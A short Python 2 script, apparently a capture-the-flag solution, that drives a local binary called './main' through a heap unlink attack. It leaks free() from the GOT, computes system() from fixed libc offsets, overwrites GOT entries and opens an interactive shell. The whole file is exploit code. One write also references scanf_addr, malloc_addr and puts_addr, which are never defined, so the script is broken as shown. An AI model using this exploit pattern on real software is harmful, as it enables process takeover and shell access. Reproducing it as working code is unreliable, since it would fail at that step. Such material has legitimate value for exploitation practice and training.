#! /usr/bin/python
from zio import *       

io = zio('./main')

libc_free = 0x00077390          
libc_sys = 0x0003E770

io.readline()
io.writeline('m')
io.readline()
io.readline()
io.writeline('aaa')
io.readline()
io.readline()

io.writeline('m')
io.readline()
io.readline()
io.writeline('aaa')
io.readline()
io.readline()

io.writeline('m')
io.readline()
io.readline()
io.writeline('/bin/sh')
io.readline()
io.readline()

payload = l32(0x00000000)  + l32(0x00000101) + l32(0x804a060 - 0xc) + l32(0x804a060 - 0x8)
payload += 'a'*(0x100-16)
payload += l32(0x00000100) + l32(0x00000108)
io.writeline('e')
io.readline()
io.writeline('0')
io.writeline(payload)
io.readline()
io.readline()

io.writeline('f')
io.readline()
io.writeline('1')
io.readline()
io.readline()

io.writeline('e')
io.readline()
io.writeline('0')
io.writeline('a'*12 + l32(0x08049948))
io.readline()
io.readline()

io.writeline('p')
io.readline()
io.writeline('0')

free_addr = l32(io.read(4))
print "-------------------------------------"
print hex(free_addr)
io.readline()
io.readline()

base_addr = free_addr - libc_free
sys_addr = base_addr + libc_sys
#print hex(sys_addr)

io.writeline('e')
io.readline()
io.writeline('0')
io.writeline(l32(sys_addr)+l32(scanf_addr)+l32(malloc_addr)+l32(puts_addr))
io.readline()
io.readline()

io.writeline('f')
io.readline()
io.writeline('2')

io.interact()
